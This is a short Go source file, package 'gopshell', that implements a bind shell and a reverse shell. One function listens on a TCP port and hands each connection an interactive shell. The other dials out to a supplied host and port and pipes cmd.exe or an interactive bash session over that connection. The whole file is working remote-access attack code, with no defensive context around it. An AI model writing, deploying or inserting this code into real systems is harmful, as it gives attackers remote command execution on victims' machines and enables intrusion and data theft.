package gopshell

import (
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
)

func RunShellCmd(mode string, host string, port string) {
	//fmt.Println("[+] Start the shell as mode :", mode)

	if mode == "bind" {
		bindShell(host, port)
	}
	if mode == "reverse" {
		reverseShell(host, port)
	}

}

func bindShell(host string, port string) {
	address := fmt.Sprintf("%s:%s", host, port)
	fmt.Println("[+] Binding to ", address)
	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Fatal("[!] Unable to bind the address")
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println(err)
		}
		//fmt.Printf("[+] Accepting connection from %s\n", conn.RemoteAddr().String())
		go runShell(conn)
	}

}

func reverseShell(host string, port string) {

	address := fmt.Sprintf("%s:%s", host, port)
	//fmt.Println("[+] Address ", address)

	conn, err := net.Dial("tcp", address)
	if err != nil {
		log.Fatal("[!] Unable to dial the address")
	}
	defer conn.Close()

	runShell(conn)
}

func runShell(conn net.Conn) {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/bash", "-i")
	}

	r, w := io.Pipe()

	cmd.Stdin = conn
	cmd.Stdout = w
	cmd.Stderr = w

	go io.Copy(conn, r)

	if err := cmd.Run(); err != nil {
		fmt.Println(err)
	}
	conn.Close()
}
